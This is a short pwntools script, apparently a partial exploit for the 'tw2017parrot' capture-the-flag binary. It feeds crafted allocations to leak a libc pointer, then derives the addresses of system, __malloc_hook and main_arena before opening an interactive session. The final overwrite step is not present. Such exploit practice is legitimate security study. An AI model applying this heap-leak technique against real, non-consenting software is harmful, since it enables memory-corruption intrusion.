from pwn import *

def malloc(size, content):
	p.sendlineafter('Size:\n', str(size))
	p.sendafter('Buffer:\n', str(content))
	

p = process('./tw2017parrot')
e = ELF('./tw2017parrot')
l = e.libc

context.log_level = "debug"

pause()

malloc(24,'a' *24)
malloc(50, 'a')
malloc(200, 'a')

### libc leak
malloc(16, 'a' * 8)
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc = libc - 88 - 16 - l.sym['__malloc_hook']
log.success('libc addr : ' + hex(libc))
log.info('system : ' + hex(libc + l.sym['system']))
log.info('__malloc_hook : ' + hex(libc + l.sym['__malloc_hook']))
log.info('main_arena : ' + hex(libc + l.sym['__malloc_hook'] + 16))
#############
malloc(2000,'a')

p.interactive()
